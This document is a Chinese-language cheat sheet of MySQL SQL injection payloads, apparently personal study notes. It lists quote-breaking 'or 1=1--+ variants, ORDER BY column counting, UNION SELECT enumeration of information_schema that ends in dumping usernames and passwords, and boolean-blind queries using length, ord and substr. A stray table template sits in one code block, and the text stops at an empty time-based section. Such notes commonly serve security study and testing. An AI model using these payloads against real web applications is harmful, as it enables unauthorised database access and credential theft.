### 报错注入
1.**常用的注释payload**
```
	or 1=1--+
	'or 1=1--+
	"or 1=1--+
	)or 1=1--+
	')or 1=1--+
	") or 1=1--+
	"))or 1=1--+
	--+ 可以用#替换，url 提交过程中 Url 编码后的#为%23
```
2. **查询字段数目**
查询字段数目主要利用MySQL里面的 order by 来判断字段数目，order by一般采用数学中的对半查找来判断具体的字段数目
```
 order by 10 --+ (二分法)
```

3. **联合查询**
UNION SELECT 联合查询，手工注入经典语句，作用是在后面通过UNION把我们的恶意注入语句接上去，带入数据库进行查询。因为字段数目是:3,那么正规的语句如下:
```
UNION SELECT 1,2,3 --+
```
4.**获取信息**
```
version()            #MySQL版本
user()               #数据库用户名
database()           #数据库名
@@datadir            #数据库路径
@@version_compile_os #操作系统版本
```
5.**获取表名**
```
UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```
6.**获取列名**
```
UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```
7.**获取字段**
```
UNION SELECT 1,2,group_concat(id,username,password) from users --+
```
8.**总结**
```
order by –+ 判断字段数目
union select –+ 联合查询收集信息
UNION SELECT 1,2,database() –+ 查询当前数据库
UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata –+查询所有数据库
UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() –+ 查询表名
UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name='users' –+ 查询列名
|column1|column2|column3|
|-|-|-|
|content1|content2|content3|
UNION SELECT 1,2,group_concat(id,username,password) from users –+ 查询字段值
```
### 布尔注入
```
SUBSTR(str,1,3)字符串截取
mid(str,1,3)字符串截取
ORD()转换成ascii码
Length()统计字节长度
version()查看数据库版本
database()查看数据库名
user()查看当前用户

```
1. 判断注入点
2. 获取数据库名称长度
```
and (select length (database())) = '8'
```
3. 获取数据库名称
and (select ord(substring(database(),1,1))) = 97
4.获取表总数
```
select count(table_name) from information_schema.tables where table_schema = database()
```
5. 获取表名长度
```
SELECT LENGTH (TABLE_NAME) from information_schema.tables where table_schema = DATABASE() LIMIT 0,1
```
6. 获取表名
```
SELECT ORD(SUBSTR((select(TABLE_NAME) from information_schema.tables where table_schema = DATABASE() limit 3,1),2,1))
```
获取字段总数
```
SELECT  COUNT(column_name) from information_schema.columns where table_name='users'
```
7. 获取字段长度
```
SELECT length(column_name) from information_schema.columns where table_name='users' LIMIT 0,1
```
7. 获取字段名称
select ord(SUBSTR((SELECT(COLUMN_NAME) from information_schema.columns where table_name='users' LIMIT 0,1),3,1))
8. 获取数据

### 延时注入
